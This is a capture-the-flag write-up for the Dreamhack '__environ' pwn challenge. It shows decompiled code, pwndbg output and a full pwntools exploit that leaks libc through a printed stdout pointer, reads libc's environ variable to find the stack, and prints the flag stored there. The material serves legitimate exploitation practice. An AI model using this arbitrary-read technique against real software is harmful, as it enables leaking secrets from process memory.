+++
date = '2026-05-08'
draft = false
title = 'Dreamhack __environ Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
Exploit Tech: __environ에서 실습하는 문제입니다.

---

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+4h] [rbp-41Ch] BYREF
  const char *v4[131]; // [rsp+8h] [rbp-418h] BYREF

  v4[130] = (const char *)__readfsqword(0x28u);
  init(argc, argv, envp);
  read_file();
  printf("stdout: %p\n", stdout);
  while ( 1 )
  {
    do
    {
      printf("> ");
      __isoc99_scanf("%d", &v3);
    }
    while ( v3 != 1 );
    printf("Addr: ");
    __isoc99_scanf("%ld", v4);
    printf("%s", v4[0]);
  }
}
```

## Identifying the vulnerabilities

First, we get an immediate `libc` leak, through `stdout`.

There is also a `read_file` function, that takes the input from `./flag` and stores it in `buf`.
```c
unsigned __int64 read_file()
{
  int fd; // [rsp+Ch] [rbp-1014h]
  _BYTE buf[16]; // [rsp+10h] [rbp-1010h] BYREF
  unsigned __int64 v3; // [rsp+1018h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fd = open("./flag", 0);
  read(fd, buf, 0xFFFu);
  close(fd);
  return v3 - __readfsqword(0x28u);
}
```
So the flag is saved somewhere on the stack in this function.. Interesting.

The fact that this challenge is named `__environ` made me do a bit of research about libc's `environ`.

I looked at [this writeup](https://ctftime.org/writeup/28116) which said the following:

> As we seen we have Full RELRO (removes the ability to perform a "GOT overwrite" attack) so we need to find another technique - according the challenge name we can get the hint that we need to get the environ - which is a variable in libc that stores the address of a part of the stack. If we have a libc base address, we can easily get where the environ variable is.

So, it's essentially an address on the stack... Maybe the flag is somehow forgotten over there, and by passing `environ` we might get lucky and print it!

We can't do much anyways, since we can only input an address and the binary will show what's stored in there. I calculated the offset from my local flag and the `environ` stack address with pwndbg:

```bash
pwndbg> search 'muie'
Searching for byte: b'muie'
[stack]         0x7ffc7c19d120 0xa6569756d /* 'muie\n' */
pwndbg> p/x &environ
$2 = 0x7fb406cd0e28
pwndbg> x/x &environ
0x7fb406cd0e28 <environ>:       0x88
pwndbg> x/gx &environ
0x7fb406cd0e28 <environ>:       0x00007ffc7c19e688
pwndbg> x/x 0x00007ffc7c19e688 - 0x7ffc7c19d120
0x1568: ❌️ Cannot access memory at address 0x1568
```

It looks like `environ` comes after the flag. So after we extract the stack leak, we just need to subtract that offset.

Important to note also, we need to send our leak as a `ld`, so not in hex format. And we send that as a string of an int.

I successfully leaked the local flag, so I connected to the remote instance, and I got the real flag as well!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/environ/environ')
libc = ELF('/home/kali/Downloads/dreamhack/environ/libc.so.6')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:9560'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

#gdb.attach(p)

p.recvuntil(b": ")
leak = p.recvline().strip()
leak = int(leak, 16)
print(elf.got)

libc.address = leak - libc.sym[b'_IO_2_1_stdout_']
#stdout = 0x1e85c0
#libc_address = leak - stdout
print(hex(libc.address))
print(hex(leak))

p.recvuntil(b"> ")
p.sendline(b"1")

environ = libc.sym[b'environ']
#environ = libc_address + 0x1eee28

p.recvuntil(b": ")
print((environ))
#success! we get the stack leak!
p.sendline(str(environ))

data = p.recv(6)
stack_leak = u64(data.ljust(8, b"\x00"))

print(hex(stack_leak))

#now we know stack -> leak flag!
p.recvuntil(b"> ")
p.sendline(b"1")

p.recvuntil(b": ")
flag = stack_leak - 0x1568
p.sendline(str(flag))

p.interactive()
```

---

Overall pretty interesting challenge, and I learned something new as well! 

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/environ.py)**.
